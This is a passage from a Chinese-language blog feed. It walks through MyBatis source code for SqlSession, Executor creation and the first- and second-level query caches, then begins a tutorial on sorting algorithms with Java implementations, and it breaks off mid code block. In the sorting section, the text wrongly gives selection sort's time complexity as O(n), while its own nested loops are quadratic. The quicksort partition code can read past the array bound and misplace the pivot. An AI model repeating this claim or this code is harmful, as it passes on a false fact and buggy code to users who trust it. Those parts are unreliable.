HashMap&lt;&gt;();</span><br></pre></td></tr></table></figure><p>首选需要初始化SqlSession</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> SqlSession <span class="title">openSessionFromDataSource</span><span class="params">(ExecutorType execType, TransactionIsolationLevel level,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">boolean</span> autoCommit)</span> </span>&#123;</span><br><span class="line">   Transaction tx = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">final</span> Environment environment = configuration.getEnvironment();</span><br><span class="line">     <span class="keyword">final</span> TransactionFactory transactionFactory = getTransactionFactoryFromEnvironment(environment);</span><br><span class="line">     tx = transactionFactory.newTransaction(environment.getDataSource(), level, autoCommit);</span><br><span class="line">     <span class="comment">// 这里会去生成一个Executor</span></span><br><span class="line">     <span class="keyword">final</span> Executor executor = configuration.newExecutor(tx, execType);</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> DefaultSqlSession(configuration, executor, autoCommit);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     closeTransaction(tx); <span class="comment">// may have fetched a connection so lets call close()</span></span><br><span class="line">     <span class="keyword">throw</span> ExceptionFactory.wrapException(<span class="string">&quot;Error opening session.  Cause: &quot;</span> + e, e);</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">     ErrorContext.instance().reset();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>初始化SqlSession的时候，他会创建一个Executor，创建的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Executor <span class="title">newExecutor</span><span class="params">(Transaction transaction, ExecutorType executorType)</span> </span>&#123;</span><br><span class="line">  executorType = executorType == <span class="keyword">null</span> ? defaultExecutorType : executorType;</span><br><span class="line">  Executor executor;</span><br><span class="line">  <span class="keyword">if</span> (ExecutorType.BATCH == executorType) &#123;</span><br><span class="line">    executor = <span class="keyword">new</span> BatchExecutor(<span class="keyword">this</span>, transaction);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ExecutorType.REUSE == executorType) &#123;</span><br><span class="line">    executor = <span class="keyword">new</span> ReuseExecutor(<span class="keyword">this</span>, transaction);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    executor = <span class="keyword">new</span> SimpleExecutor(<span class="keyword">this</span>, transaction);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果启用二级缓存，那么就是CachingExecutor这个</span></span><br><span class="line">  <span class="keyword">if</span> (cacheEnabled) &#123;</span><br><span class="line">    executor = <span class="keyword">new</span> CachingExecutor(executor);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (Executor) interceptorChain.pluginAll(executor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Executor负责处理和数据库打交道，如果是select查询的话，会走到query方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">query</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">  BoundSql boundSql = ms.getBoundSql(parameter);</span><br><span class="line">  CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);</span><br><span class="line">  <span class="keyword">return</span> query(ms, parameter, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query方法会去创建一个CacheKey，创建过程如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CacheKey <span class="title">createCacheKey</span><span class="params">(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (closed) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ExecutorException(<span class="string">&quot;Executor was closed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  CacheKey cacheKey = <span class="keyword">new</span> CacheKey();</span><br><span class="line">  cacheKey.update(ms.getId());</span><br><span class="line">  cacheKey.update(rowBounds.getOffset());</span><br><span class="line">  cacheKey.update(rowBounds.getLimit());</span><br><span class="line">  cacheKey.update(boundSql.getSql());</span><br><span class="line">  List&lt;ParameterMapping&gt; parameterMappings = boundSql.getParameterMappings();</span><br><span class="line">  TypeHandlerRegistry typeHandlerRegistry = ms.getConfiguration().getTypeHandlerRegistry();</span><br><span class="line">  <span class="comment">// mimic DefaultParameterHandler logic</span></span><br><span class="line">  MetaObject metaObject = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">for</span> (ParameterMapping parameterMapping : parameterMappings) &#123;</span><br><span class="line">    <span class="keyword">if</span> (parameterMapping.getMode() != ParameterMode.OUT) &#123;</span><br><span class="line">      Object value;</span><br><span class="line">      String propertyName = parameterMapping.getProperty();</span><br><span class="line">      <span class="keyword">if</span> (boundSql.hasAdditionalParameter(propertyName)) &#123;</span><br><span class="line">        value = boundSql.getAdditionalParameter(propertyName);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (parameterObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">        value = <span class="keyword">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) &#123;</span><br><span class="line">        value = parameterObject;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (metaObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">          metaObject = configuration.newMetaObject(parameterObject);</span><br><span class="line">        &#125;</span><br><span class="line">        value = metaObject.getValue(propertyName);</span><br><span class="line">      &#125;</span><br><span class="line">      cacheKey.update(value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (configuration.getEnvironment() != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// issue #176</span></span><br><span class="line">    cacheKey.update(configuration.getEnvironment().getId());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cacheKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到CacheKey的id是通过MapperStatement的id、offset、limit、sql还有参数来决定的。</p><p>继续往下走会发现使用缓存的地方，如果存在缓存就直接使用缓存，否则就使用queryFromDatabase方法去数据库进行查询。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list = resultHandler == <span class="keyword">null</span> ? (List&lt;E&gt;) localCache.getObject(key) : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (list != <span class="keyword">null</span>) &#123;</span><br><span class="line">  handleLocallyCachedOutputParameters(ms, key, parameter, boundSql);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在query方法的最后，如果开起了二级缓存，则清空一级缓存的数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) &#123;</span><br><span class="line">     <span class="comment">// issue #482</span></span><br><span class="line">     clearLocalCache();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>queryFromDatabase方法里面对一级缓存做了操作，将doQuery的查询结果放入一级缓存里面，如果doQuery报错了，还是会remove掉一级缓存的数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">queryFromDatabase</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds,</span></span></span><br><span class="line"><span class="function"><span class="params">    ResultHandler resultHandler, CacheKey key, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">  List&lt;E&gt; list;</span><br><span class="line">  localCache.putObject(key, EXECUTION_PLACEHOLDER);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    localCache.removeObject(key);</span><br><span class="line">  &#125;</span><br><span class="line">  localCache.putObject(key, list);</span><br><span class="line">  <span class="keyword">if</span> (ms.getStatementType() == StatementType.CALLABLE) &#123;</span><br><span class="line">    localOutputParameterCache.putObject(key, parameter);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一级缓存的查询逻辑，那么如果是insert、delete、update呢？</p><p>在进行insert、delete、update的时候，最终都会走到Executor的update方法，而这个方法里面都会在提交sql之前执行clearLocalCache()方法来清理一级缓存的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(MappedStatement ms, Object parameter)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">   ErrorContext.instance().resource(ms.getResource()).activity(<span class="string">&quot;executing an update&quot;</span>).object(ms.getId());</span><br><span class="line">   <span class="keyword">if</span> (closed) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> ExecutorException(<span class="string">&quot;Executor was closed.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   clearLocalCache();</span><br><span class="line">   <span class="keyword">return</span> doUpdate(ms, parameter);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="二级缓存"><a href="#二级缓存" class="headerlink" title="二级缓存"></a>二级缓存</h4><p>开启二级缓存</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>二级缓存主要是类CachingExecutor，在前面说到创建Executor的时候，当开启二级缓存的时候CachingExecutor对平常的Executor做了一个封装。</p><p>看一下他的query方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">query</span><span class="params">(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler,</span></span></span><br><span class="line"><span class="function"><span class="params">      CacheKey key, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    Cache cache = ms.getCache();</span><br><span class="line">    <span class="keyword">if</span> (cache != <span class="keyword">null</span>) &#123;</span><br><span class="line">      flushCacheIfRequired(ms);</span><br><span class="line">      <span class="keyword">if</span> (ms.isUseCache() &amp;&amp; resultHandler == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ensureNoOutParams(ms, boundSql);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        List&lt;E&gt; list = (List&lt;E&gt;) tcm.getObject(cache, key);</span><br><span class="line">        <span class="keyword">if</span> (list == <span class="keyword">null</span>) &#123;</span><br><span class="line">          list = delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">          tcm.putObject(cache, key, list); <span class="comment">// issue #578 and #116</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>首先会从MappedStatement里面获取Cache，这个Cache是链式结构，里面有很多的Cache实现，拥有不同的逻辑实现。</p><ul><li>  <code>SynchronizedCache</code>：同步Cache，实现比较简单，直接使用synchronized修饰方法。</li><li>  <code>LoggingCache</code>：日志功能，装饰类，用于记录缓存的命中率，如果开启了DEBUG模式，则会输出命中率日志。</li><li>  <code>SerializedCache</code>：序列化功能，将值序列化后存到缓存中。该功能用于缓存返回一份实例的Copy，用于保存线程安全。</li><li>  <code>LruCache</code>：采用了Lru算法的Cache实现，移除最近最少使用的Key/Value。</li><li>  <code>PerpetualCache</code>： 作为为最基础的缓存类，底层实现比较简单，直接使用了HashMap。</li></ul><p>具体的详细解析可以参考<a href="https://tech.meituan.com/2018/01/19/mybatis-cache.html">美团</a>的文档。</p><p>参考链接</p><p><a href>Mybatis都有哪些Executor执行器？它们之间的区别是什么？</a></p><p><a href="https://tech.meituan.com/2018/01/19/mybatis-cache.html">聊聊MyBatis缓存机制</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MyBatis&quot;&gt;&lt;a href=&quot;#MyBatis&quot; class=&quot;headerlink&quot; title=&quot;MyBatis&quot;&gt;&lt;/a&gt;MyBatis&lt;/h2&gt;&lt;h3 id=&quot;MyBatis的作用&quot;&gt;&lt;a href=&quot;#MyBatis的作用&quot; class=&quot;head</summary>
      
    
    
    
    <category term="mybatis" scheme="http://fireflyingup.github.io/categories/mybatis/"/>
    
    
    <category term="mybatis" scheme="http://fireflyingup.github.io/tags/mybatis/"/>
    
  </entry>
  
  <entry>
    <title>算法与数据结构</title>
    <link href="http://fireflyingup.github.io/2023/04/28/algorithm/"/>
    <id>http://fireflyingup.github.io/2023/04/28/algorithm/</id>
    <published>2023-04-28T02:09:01.000Z</published>
    <updated>2024-01-10T08:30:41.883Z</updated>
    
    <content type="html"><![CDATA[<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/image-20231219134250142.png"></div></div><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>冒泡排序的思想是相邻两个数进行大小比较，一步一步的将大的数往后移动，每次循环得到未排序数组里面的最大值。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/bubbleSort.gif"></div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> length = array.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; length - <span class="number">1</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (array[j] &gt; array[j + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = array[j];</span><br><span class="line">        array[j] = array[j + <span class="number">1</span>];</span><br><span class="line">        array[j + <span class="number">1</span>] = temp;</span><br><span class="line">        flag = <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag) <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：升序的时候最好O(n)，降序的时候最坏O(n^2)，平均时间复杂度O(n^2)。</p><p>空间复杂度：O(1)。</p><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>选择排序的思想是在剩余的未排序数组里面每次选取最小的放入未排序数组的最前方，重复此步骤，直到排序完成，所以选择排序的时间复杂度很固定。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/selectionSort.gif"></div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> length = array.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">int</span> minIndex = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; length; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (array[j] &lt; array[minIndex]) &#123;</span><br><span class="line">        minIndex = j;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> temp = array[i];</span><br><span class="line">    array[i] = array[minIndex];</span><br><span class="line">    array[minIndex] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n)</p><p>空间复杂度：O(1)</p><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>插入排序的思路和打扑克牌的抓牌时候一样，每次抓牌从手牌右到左比较，遇到比自己小的就插入进去，所以时间复杂度不固定，当是增序的时候每次插入最右边，时间复杂度为O(n)，反之则时间复杂度更高为O(n^2)。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/insertionSort.gif"></div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> length = array.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">    <span class="keyword">int</span> j = i - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> temp = array[i];</span><br><span class="line">    <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; array[j] &gt; temp) &#123;</span><br><span class="line">      array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">      j--;</span><br><span class="line">    &#125;</span><br><span class="line">    array[j + <span class="number">1</span>] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>归并排序的思想是一种分而治之的思想，将一个大的数组分成2部分，每个部分在继续分成两部分，递归直到不能分的时候，然后将子方法获取到的两个部分就是有序的两个数组 采取双指针法 进行排序。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/mergeSort.gif"></div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] sort(<span class="keyword">int</span>[] arrays) &#123;</span><br><span class="line">    <span class="keyword">int</span> length = arrays.length;</span><br><span class="line">    <span class="keyword">if</span> (length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> arrays;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> middle = length/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span>[] left = Arrays.copyOfRange(arrays, <span class="number">0</span>, middle);</span><br><span class="line">    <span class="keyword">int</span>[] right = Arrays.copyOfRange(arrays, middle, length);</span><br><span class="line">    <span class="keyword">return</span> merge(sort(left), sort(right));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] merge(<span class="keyword">int</span>[] left, <span class="keyword">int</span>[] right) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] target = <span class="keyword">new</span> <span class="keyword">int</span>[left.length + right.length];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; left.length || j &lt; right.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == left.length) &#123;</span><br><span class="line">            target[index++] = right[j++];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == right.length) &#123;</span><br><span class="line">            target[index++] = left[i++];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left[i] &lt; right[j]) &#123;</span><br><span class="line">            target[index++] = left[i++];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[index++] = right[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(nlogn)</p><p>空间复杂度：O(n)</p><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><ol><li>从数列中挑出一个元素，称为 “基准”（pivot）;</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="/2023/04/28/algorithm/quickSort.gif"></div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] sort(<span class="keyword">int</span>[] arrays, <span class="keyword">int</span> left, <span class="keyword">int</span> right) &#123;</span><br><span class="line">      <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">          <span class="keyword">int</span> partition = partition(arrays, left, right);</span><br><span class="line">          sort(arrays, left, partition - <span class="number">1</span>);</span><br><span class="line">          sort(arrays, partition + <span class="number">1</span>, right);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> arrays;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> index = left + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = index; i &lt;= right; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (array[left] &gt; array[i]) &#123;</span><br><span class="line">              swap(array, index, i);</span><br><span class="line">              index++;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (array[left] &gt; array[index]) &#123;</span><br><span class="line">          swap(array, left, index);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> index - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> temp = array[left];</span><br><span class="line">      array[left] = array[right];</span><br><span class="line">      array[right] = temp;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 